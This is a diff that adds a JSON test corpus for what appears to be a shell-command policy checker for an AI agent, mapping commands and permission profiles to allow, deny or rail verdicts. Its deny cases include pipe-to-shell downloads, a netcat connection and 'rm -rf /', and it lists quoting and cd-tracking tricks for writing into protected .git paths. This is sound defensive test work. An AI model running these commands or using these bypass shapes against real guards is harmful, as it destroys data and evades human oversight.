@@ -1,0 +1,87 @@
+[
+  { "cmd": "curl x | sh", "shell": "both", "profile": "off", "expect": "deny", "note": "security-floor always-on even at profile=off (SP-security-floor-always); old corpus.yml line 29" },
+  { "cmd": "curl x | sh", "shell": "both", "profile": "autonomous", "expect": "deny", "note": "security-floor at strictest profile too" },
+  { "cmd": "wget x | bash", "shell": "both", "profile": "off", "expect": "deny", "note": "old corpus.yml line 30" },
+  { "cmd": "nc 1.2.3.4 4444", "shell": "both", "profile": "off", "expect": "deny", "note": "old corpus.yml line 31" },
+  { "cmd": "nc 1.2.3.4 4444", "shell": "both", "profile": "guarded", "expect": "deny", "note": "old always-on = guarded mapping" },
+  { "cmd": "ssh user@h", "shell": "both", "profile": "off", "expect": "deny", "note": "old corpus.yml line 32" },
+  { "cmd": "rm -rf /", "shell": "both", "profile": "off", "expect": "deny", "note": "old corpus.yml line 33; DoD example" },
+  { "cmd": "rm -rf /", "shell": "both", "profile": "assist", "expect": "deny", "note": "security-floor unaffected by profile" },
+  { "cmd": "rm -rf /", "shell": "both", "profile": "guarded", "expect": "deny", "note": "old always-on = guarded mapping" },
+  { "cmd": "rm -rf /", "shell": "both", "profile": "autonomous", "expect": "deny" },
+  { "cmd": "rm -fr /", "shell": "both", "profile": "guarded", "expect": "deny", "note": "rm_rf pattern alt form -fr" },
+
+  { "cmd": "git status", "shell": "both", "profile": "off", "expect": "allow", "note": "git-READ; old corpus.yml line 9" },
+  { "cmd": "git status", "shell": "both", "profile": "guarded", "expect": "allow", "note": "git-READ unaffected by rail" },
+  { "cmd": "git diff", "shell": "both", "profile": "guarded", "expect": "allow", "note": "old corpus.yml line 10" },
+  { "cmd": "git log", "shell": "both", "profile": "guarded", "expect": "allow", "note": "old corpus.yml line 11" },
+  { "cmd": "git rev-parse HEAD", "shell": "both", "profile": "guarded", "expect": "allow", "note": "old corpus.yml line 12" },
+  { "cmd": "git show", "shell": "both", "profile": "guarded", "expect": "allow", "note": "old corpus.yml line 13" },
+  { "cmd": "git branch", "shell": "both", "profile": "guarded", "expect": "allow", "note": "old corpus.yml line 14; git branch without -d/-D is READ" },
+
+  { "cmd": "git commit -m x", "shell": "both", "profile": "off", "expect": "allow", "note": "rail.level=none -> raw git allowed (operator trusted)" },
+  { "cmd": "git commit -m x", "shell": "both", "profile": "assist", "expect": "allow", "note": "rail.level=none -> raw git allowed" },
+  { "cmd": "git commit -m x", "shell": "both", "profile": "guarded", "expect": "rail", "note": "rail.level=commit, commit within reach; old corpus.yml line 17 (always-on rail)" },
+  { "cmd": "git commit -m x", "shell": "both", "profile": "autonomous", "expect": "rail", "note": "rail.level=merge, commit within reach" },
+
+  { "cmd": "git push", "shell": "both", "profile": "off", "expect": "allow", "note": "rail.level=none -> raw git allowed" },
+  { "cmd": "git push", "shell": "both", "profile": "guarded", "expect": "deny", "note": "reach decision D6: rail.level=commit does NOT cover push -> beyond-reach deny (DEVIATION from old always-on-rail corpus.yml line 18, which had no reach concept; contract explicitly requires guarded->deny for push)" },
+  { "cmd": "git push", "shell": "both", "profile": "autonomous", "expect": "rail", "note": "rail.level=merge covers push -> rail" },
+
+  { "cmd": "git merge b", "shell": "both", "profile": "off", "expect": "allow" },
+  { "cmd": "git merge b", "shell": "both", "profile": "guarded", "expect": "deny", "note": "beyond reach at rail.level=commit (same D6 reasoning as push); old corpus.yml line 19 was always-on rail, superseded by reach semantics" },
+  { "cmd": "git merge b", "shell": "both", "profile": "autonomous", "expect": "rail", "note": "rail.level=merge covers merge -> rail" },
+
+  { "cmd": "git reset --hard", "shell": "both", "profile": "off", "expect": "allow", "note": "rail.level=none -> raw git allowed; DoD example" },
+  { "cmd": "git reset --hard", "shell": "both", "profile": "guarded", "expect": "deny", "note": "non-railable mutation under rail!=none; old corpus.yml line 22 (guarded mapping)" },
+  { "cmd": "git checkout .", "shell": "both", "profile": "guarded", "expect": "deny", "note": "non-railable mutation; old corpus.yml line 23" },
+  { "cmd": "git rebase -i", "shell": "both", "profile": "guarded", "expect": "deny", "note": "non-railable mutation; old corpus.yml line 24" },
+
+  { "cmd": "git branch -d feature", "shell": "both", "profile": "off", "expect": "allow", "note": "branch-delete at rail.level=none -> allow; DoD example" },
+  { "cmd": "git branch -d feature", "shell": "both", "profile": "guarded", "expect": "deny", "note": "branch-delete at rail!=none always deny; old corpus.yml line 25" },
+  { "cmd": "git branch -D feature", "shell": "both", "profile": "guarded", "expect": "deny", "note": "old corpus.yml line 26" },
+
+  { "cmd": "git.exe commit -m x", "shell": "both", "profile": "guarded", "expect": "rail", "note": "FIX-4 (security review): git.exe must classify same as bare git; old corpus.yml line 63" },
+
+  { "cmd": "echo x > .git/y", "shell": "both", "profile": "assist", "actor": "operator", "expect": "allow", "note": "T2b: operator_zone off at assist -> zone-check skipped, operator trusted (contract §Scope)" },
+  { "cmd": "echo x > .git/y", "shell": "both", "profile": "guarded", "actor": "operator", "protected": [".git"], "expect": "deny", "note": "T2b: operator + operator_zone enabled (guarded) + protected=[.git] -> write to .git denied" },
+  { "cmd": "echo x > .omp/y", "shell": "both", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "deny", "note": "T2b: worker bash-denylist zone.deny=[.omp], direct write -> deny" },
+  { "cmd": "echo x > .omp/y", "shell": "both", "profile": "assist", "zone": { "deny": [".omp"] }, "expect": "deny", "note": "T2b fail-closed: actor omitted -> treated as worker (strict), zone.deny applies regardless of profile" },
+  { "cmd": "cd .omp && echo bad > config.yml", "shell": "both", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "deny", "note": "T2b FIX-3: cd-tracking across segments — relative write under protected cwd, no explicit .omp mention -> conservative deny" },
+  { "cmd": "echo x > out.txt; cat .omp/y", "shell": "both", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "allow", "note": "T2b FIX-3: write goes to out.txt (unrelated segment); .omp only READ in a later segment -> allow, not a false-positive" },
+  { "cmd": "cat .omp/config.yml", "shell": "posix", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "allow", "note": "T2b BASH_WRITE_PROTECTED: cat is a READ verb, absent from token_tables -> mentioning a protected path in a read command never triggers write-intent" },
+  { "cmd": "ls -la .omp/", "shell": "posix", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "allow", "note": "T2b BASH_WRITE_PROTECTED: ls is a READ verb, absent from token_tables" },
+  { "cmd": "Get-Content .omp/x", "shell": "powershell", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "allow", "note": "T2b BASH_WRITE_PROTECTED: Get-Content is a READ verb, absent from token_tables" },
+  { "cmd": "(cd .omp); echo x > out.txt", "shell": "both", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "allow", "note": "T2b FIX-3 subshell isolation: cd inside (...) does not leak state to the outer chain — subsequent write to out.txt is unaffected" },
+  { "cmd": "Remove-Item .omp/x", "shell": "powershell", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "deny", "note": "T2b PS token-table parity: Remove-Item is powershell-only write token" },
+  { "cmd": "Remove-Item .omp/x", "shell": "posix", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "allow", "note": "T2b: Remove-Item is absent from the posix table -> not recognized as a write token under shell=posix" },
+  { "cmd": "sed -i s/a/b/ .omp/x", "shell": "posix", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "deny", "note": "T2b posix token-table parity: multi-word token \"sed -i\" (internal space -> \\s+) recognized, direct .omp mention after token -> deny" },
+  { "cmd": "mv a .omp/x", "shell": "both", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "deny", "note": "T2b: mv present in both posix+powershell tables -> shell:both parity" },
+
+  { "cmd": "echo x > .git/config", "shell": "both", "profile": "guarded", "actor": "operator", "expect": "deny", "note": "FIX-1 (security-review blocker): operator+guarded, NO explicit operator_zone.protected -> DEFAULT_PROTECTED floor ([.git]) still denies write to .git/config" },
+  { "cmd": "echo x > .git/x", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "deny", "note": "FIX-1: worker, NO zone.deny configured -> DEFAULT_PROTECTED floor ([.git]) still denies write to .git" },
+
+  { "cmd": "cd .omp & echo bad > x", "shell": "both", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "deny", "note": "FIX-2 (security-review minor, improvement over intent.py): bare `&` is a top-level separator too (background job); cd-tracking must see the segment boundary -> conservative deny, closes pre-existing intent.py separator-gap" },
+  { "cmd": "cd .omp\necho bad > x", "shell": "both", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "deny", "note": "FIX-2: literal newline is a top-level separator too -> same cd-tracking bypass closed as bare `&`" },
+
+  { "cmd": "(cd .git/hooks && echo x > pre-commit)", "shell": "both", "profile": "guarded", "actor": "worker", "zone": { "deny": [".git"] }, "expect": "deny", "note": "FIX-3 parity: nested subshell with inner && separator — recursion into the subshell's own segment-split still tracks cd -> conservative deny (old corpus.yml parity)" },
+  { "cmd": "powershell -Command \"Remove-Item .omp/f\"", "shell": "powershell", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "deny", "note": "FIX-3 parity: powershell-in-bash — Remove-Item token matches even nested inside a quoted -Command argument (flat regex scan, same as intent.py); old corpus.yml parity" },
+  { "cmd": "cat .git/HEAD", "shell": "posix", "profile": "guarded", "actor": "worker", "zone": { "deny": [".git"] }, "expect": "allow", "note": "FIX-3 parity: .git/HEAD READ (cat is not a token) -> allow (BASH_WRITE_PROTECTED); old corpus.yml parity" },
+  { "cmd": "echo x > .git/HEAD", "shell": "both", "profile": "guarded", "actor": "operator", "protected": [".git"], "expect": "deny", "note": "FIX-3 parity: .git/HEAD WRITE, operator+guarded+protected=[.git] -> deny; old corpus.yml parity" },
+  { "cmd": "grep foo .omp/zonemap.yml", "shell": "posix", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "allow", "note": "FIX-3 parity: grep is a READ verb, absent from token_tables -> allow; old corpus.yml parity" },
+  { "cmd": "echo x > /tmp/y", "shell": "both", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "allow", "note": "FIX-3 parity: write-outside-protected control — absolute path /tmp/y is provably elsewhere -> allow; old corpus.yml parity" },
+  { "cmd": "Out-File out.txt", "shell": "powershell", "profile": "guarded", "actor": "worker", "zone": { "deny": [".omp"] }, "expect": "allow", "note": "FIX-3 parity: write-outside-protected control — Out-File token present but no protected-path target -> allow; old corpus.yml parity" },
+
+  { "cmd": "node -e \"x => 1\" ; echo .git", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "allow", "note": "T7-6 L-2 quote-aware redirects: the '>' inside a double-quoted JS arrow-fn arg is a literal char, not a redirect (DEFAULT_PROTECTED floor [.git] would otherwise deny); 'echo .git' is a bare mention, no write token -> allow" },
+  { "cmd": "echo a=>.git/x", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "deny", "note": "T7-6 L-2: unquoted '=>' still contains a real unquoted '>' redirect operator (bash does not require whitespace around it) -> write to .git/x -> deny, not weakened" },
+  { "cmd": "echo \"a>b\" > .git/x", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "deny", "note": "T7-6 L-2: the quoted '>' inside \"a>b\" is literal; the SECOND, unquoted '>' is a real redirect to .git/x -> deny" },
+  { "cmd": "echo 'a > .git/x'", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "allow", "note": "T7-6 L-2: entire redirect-looking text is single-quoted (100% literal in bash) -> no real redirect operator at all -> allow" },
+  { "cmd": "echo a\\>.git/x", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "allow", "note": "T7-6 L-2: backslash-escaped '\\>' is a literal char in bash (outside quotes, '\\' escapes the very next char) -> no real redirect -> allow" },
+  { "cmd": "echo x >> .git/log", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "deny", "note": "T7-6 L-2 non-weakening sanity: unquoted '>>' is still a real redirect -> deny (unchanged)" },
+  { "cmd": "echo '>> .git/log'", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "allow", "note": "T7-6 L-2: single-quoted '>>' is literal text, no real redirect -> allow" },
+
+  { "cmd": "echo \"a;b\" > .git/x", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "deny", "note": "Amend A1 regression: splitSegments must NOT split on a ';' inside a quoted string — the quoted 'a;b' stays one segment, the REAL unquoted '>' after it is a redirect to .git/x -> deny (was a live ALLOW-regression before A1: blind splitting tore the segment at the quoted ';', leaving an orphan quote char that masked the real '>' as quoted)" },
+  { "cmd": "echo 'a|b' > .git/x", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "deny", "note": "Amend A1 regression: same as above with '|' inside single quotes -> deny" },
+  { "cmd": "echo \"a && b\" >> .git/config", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "deny", "note": "Amend A1 regression: same as above with '&&' inside double quotes, real redirect is '>>' -> deny" },
+  { "cmd": "echo \"a > .git/x", "shell": "both", "profile": "guarded", "actor": "worker", "expect": "deny", "note": "Amend A1 fail-closed: unterminated double quote at end of command — the '>' inside the never-closed quote must NOT be masked as literal; ambiguous quoting -> treat as unquoted/real -> deny, never silently ALLOW" }
+]
